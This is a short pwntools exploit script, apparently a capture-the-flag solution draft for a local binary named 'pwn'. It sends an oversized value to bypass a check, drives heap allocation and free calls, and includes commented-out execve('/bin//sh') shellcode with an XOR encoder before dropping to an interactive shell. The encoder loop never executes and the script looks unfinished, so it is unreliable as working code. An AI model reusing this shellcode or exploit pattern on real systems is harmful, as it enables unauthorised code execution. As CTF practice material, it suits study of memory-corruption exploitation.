from pwn import *
context.binary = './pwn'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = elf.libc

p = process('./pwn')

def dbg():
	raw_input()

def create(content):
	p.recvuntil('> ')
	p.sendline('1')
	p.recvuntil('> ')
	p.sendline(str(len(content)))
	p.recvuntil('> ')
	p.send(content)	

def delete():
	p.recvuntil('> ')
	p.sendline('2')

def encode(shell):
	lenth = len(shell)
	for i in range(1, lenth, -1):
		shell[i] ^= shell[i-1]

	return  shell


#bypass check
p.recvuntil('> ')
p.sendline('a')
p.recvuntil('> ')
p.sendline(str(0xffff0000))


gdb.attach(p)
dbg()
#heap

create('a'*0x400)
delete()

"""
#shellcode exe

shellcode =  "\x48\x31\xf6\x56\x48\xbf"
shellcode += "\x2f\x62\x69\x6e\x2f"
shellcode += "\x2f\x73\x68\x57\x54"
shellcode += "\x5f\xb0\x3b\x99\x0f\x05\x90\x90\x90\x90"


en_shell = encode(shellcode)
p.sendline(en_shell)
"""
p.sendline('3`')
p.interactive()
p.close()